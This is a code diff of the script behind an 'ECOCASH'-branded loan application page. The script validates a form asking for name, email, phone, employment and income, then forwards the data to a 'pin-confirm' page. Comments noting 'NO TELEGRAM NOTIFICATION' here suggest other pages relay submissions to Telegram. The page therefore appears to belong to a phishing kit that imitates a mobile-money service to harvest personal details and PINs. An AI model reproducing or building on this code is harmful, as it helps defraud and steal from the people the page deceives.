@@ -261,27 +261,27 @@
 </div>
 
 <script>
-    // ============================================
-    // ECOCASH - NO TELEGRAM NOTIFICATION ON THIS PAGE
-    // ============================================
-    
+    // Simple phone validation
     function isValidPhone(phone) {
         const cleaned = phone.replace(/[\s\-\(\)]/g, '');
         const regex = /^\+\d{10,14}$/;
         return regex.test(cleaned);
     }
 
+    // Get loan data from URL
     const urlParams = new URLSearchParams(window.location.search);
     const amount = urlParams.get('amount') || '0';
     const term = urlParams.get('term') || '0';
     const rate = urlParams.get('rate') || '5';
     const monthly = urlParams.get('monthly') || '0';
 
+    // Update summary bar
     document.getElementById('summaryAmount').innerText = `$ ${parseInt(amount).toLocaleString()}`;
     document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
     document.getElementById('summaryMonthly').innerText = `$ ${parseFloat(monthly).toFixed(2)}`;
     document.getElementById('summaryRate').innerText = `${rate}%`;
 
+    // Handle form submission - ONLY redirect, NO Telegram
     document.getElementById('applicationForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -293,6 +293,7 @@
         const consent = document.getElementById('consent').checked;
         const errorMsgDiv = document.getElementById('errorMessage');
         
+        // Validation
         if (!fullName || !email || !phone || !employment || !monthlyIncome || !consent) {
             errorMsgDiv.textContent = 'Please fill all required fields';
             errorMsgDiv.classList.add('show');
@@ -309,8 +310,7 @@
         
         errorMsgDiv.classList.remove('show');
         
-        // NO TELEGRAM NOTIFICATION - Just redirect to next page
-        
+        // Just redirect to pin-confirm page - NO TELEGRAM
         const params = new URLSearchParams();
         params.set('amount', amount);
         params.set('term', term);
